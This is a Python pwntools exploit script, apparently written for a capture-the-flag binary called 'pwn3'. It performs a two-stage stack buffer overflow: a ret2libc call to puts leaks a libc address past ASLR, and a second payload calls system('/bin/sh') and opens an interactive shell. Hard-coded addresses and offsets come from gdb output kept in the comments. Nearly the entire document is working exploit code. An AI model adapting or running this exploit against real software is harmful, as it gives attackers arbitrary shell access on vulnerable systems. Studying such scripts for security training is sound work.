#!/usr/bin/env python3

from pwn import *

offset=140
p = process('./pwn3')

# This exploit is valid also with ASLR - it leaks the address of libc function puts and uses offset to calculate the address of system(), "/bin/sh" and exit()
# technique
# execute an initial run abusing the no PIE  
# using a ret2libc with
# - puts
# - main
# - puts.got
# we will be able to trigger a puts(puts.got) and then jump again to main()
# we should get a leak of puts address after the procedure link change the address due to ASLR  

# gdb-peda$ p main
# $1 = {<text variable, no debug info>} 0x804847d <main>
# gdb-peda$ p puts
#$2 = {<text variable, no debug info>} 0x8048340 <puts@plt>
#gdb-peda$ disassemble puts
#Dump of assembler code for function puts@plt:
#   0x08048340 <+0>:     jmp    DWORD PTR ds:0x80497b0
#   0x08048346 <+6>:     push   0x8
#   0x0804834b <+11>:    jmp    0x8048320

puts     = 0x08048340
puts_got = 0x080497b0
main     = 0x0804847d

payload  = b"A"*offset 
payload += p32(puts)
payload += p32(main)
payload += p32(puts_got) 


p.recvuntil("sweet desert:")
p.sendline(payload)
output=p.recvline()
output=p.recvline()
leak = u32(output[:4])
log.info('puts@libc is at: {}'.format(hex(leak)))



#gdb-peda$ p system
#$1 = {<text variable, no debug info>} 0xf7c4c800 <system>
#gdb-peda$ p puts
#$2 = {<text variable, no debug info>} 0xf7c74db0 <puts>
#gdb-peda$ find "/bin/sh"
#Searching for '/bin/sh' in: None ranges
#Found 1 results, display max 1 items:
#libc.so.6 : 0xf7db5faa ("/bin/sh")
#gdb-peda$ p exit
#$3 = {<text variable, no debug info>} 0xf7c3bc90 <exit>

offset_system = 0xf7c74db0 - 0xf7c4c800
offset_binsh = 0xf7db5faa - 0xf7c74db0
offset_exit = 0xf7c74db0 - 0xf7c3bc90

system_address = leak - offset_system
exit_address = leak - offset_exit
binsh_address = leak + offset_binsh

log.info('puts@libc is at: {}'.format(hex(leak)))
log.info('system@libc is at: {}'.format(hex(system_address)))
log.info('exit@libc is at: {}'.format(hex(exit_address)))
log.info('binsh@libc is at: {}'.format(hex(binsh_address)))


payload  = b"A"*(offset-8) 
payload += p32(system_address)
payload += p32(exit_address)
payload += p32(binsh_address) 
payload += p32(0) 

p.recvuntil("sweet desert:")
p.sendline(payload)
p.interactive()

